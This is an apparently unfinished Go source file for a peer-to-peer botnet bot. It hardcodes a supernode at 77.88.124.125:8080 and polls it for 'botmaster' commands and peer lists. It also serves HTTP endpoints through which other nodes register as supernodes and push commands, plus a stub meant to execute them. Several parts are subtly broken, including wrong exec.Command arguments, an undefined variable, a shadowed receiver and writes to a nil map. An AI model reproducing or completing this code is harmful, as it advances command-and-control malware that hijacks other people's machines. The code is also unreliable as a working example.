package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

type BotFunc interface {
	Online()
	StartSupernode()
	AddNewSupernode(node string)
	InvokeCommand()
}

type Bot struct {
	IP 			string
	Supernodes  []string
	Commands    []string
	Publickey   string
	OnlineTicker *time.Ticker
}

func main() {
	//List of supernodes
	//Public key used to decrypt a command sent from botmaster encrypted with private key
	//Start as a worker, if connection can be recieved, switch to supernode
	//Receive Command
	//Send Command
	//Execute Command
	bot := Bot{
		Supernodes: []string{"77.88.124.125:8080"},
		Commands: []string{},
		Publickey: "",
		OnlineTicker: time.NewTicker(5 * time.Minute),
	}
	go bot.StartSupernode()
	bot.Online()
}

func(b *Bot)StartSupernode() {
	defer func() {
		recover()
	}()
	http.HandleFunc("/AddNewSupernode/", func(w http.ResponseWriter, r *http.Request) {
		b.IP = strings.TrimPrefix(r.URL.Path, "/AddNewSupernode/")
		json.NewEncoder(w).Encode(true)
	})
	http.HandleFunc("/ReceiveCommand/", func(w http.ResponseWriter, r *http.Request) {
		command := strings.TrimPrefix(r.URL.Path, "/ReceiveCommand/")
		b.Commands = []string{command}
		json.NewEncoder(w).Encode(true)
	})
	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
		go b.AddNewSupernode(r.RemoteAddr)
		var respBody map[string][]string
		respBody["supernodes"] = b.Supernodes
		respBody["commands"] = b.Commands
		json.NewEncoder(w).Encode(respBody)
	})
	if err := http.ListenAndServe(":8080", nil); err != nil {
		panic(err)
	}
}

func(b *Bot)Online() {
	for {
		for _, supernode := range b.Supernodes {
			resp, err := http.Get(supernode + "/Online")
			if err != nil {
				panic(err)
			}
			var respBody map[string][]string
			json.NewDecoder(resp.Body).Decode(&respBody)
			b.Supernodes = b.UniqueSupernodes(append(b.Supernodes, respBody["supernodes"]...))
			b.Commands = respBody["commands"]
			resp.Body.Close()
		}
		b.InvokeCommand()
	<-b.OnlineTicker.C
	}
}

func(b *Bot)AddNewSupernode(node string) {
	defer func() {
		recover()
	}()
	resp, err := http.Get(node + "/AddNewSupernode/" + node)
	if err != nil {
		panic(err)
	}
	b.Supernodes = b.UniqueSupernodes(append(b.Supernodes, node))
	resp.Body.Close()
}

func(b *Bot)InvokeCommand() {
	cmd := exec.Command("/bin/ls", []string{app, "-l"}, nil, "", exec.DevNull, exec.Pipe, exec.Pipe)

	var b bytes.Buffer
	io.Copy(&b, cmd.Stdout)
	fmt.Println(b.String())

}

func(b *Bot) UniqueSupernodes(supernodes []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	if b.IP != "" {
		keys[b.IP] = true
	}

	for _, entry := range supernodes {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}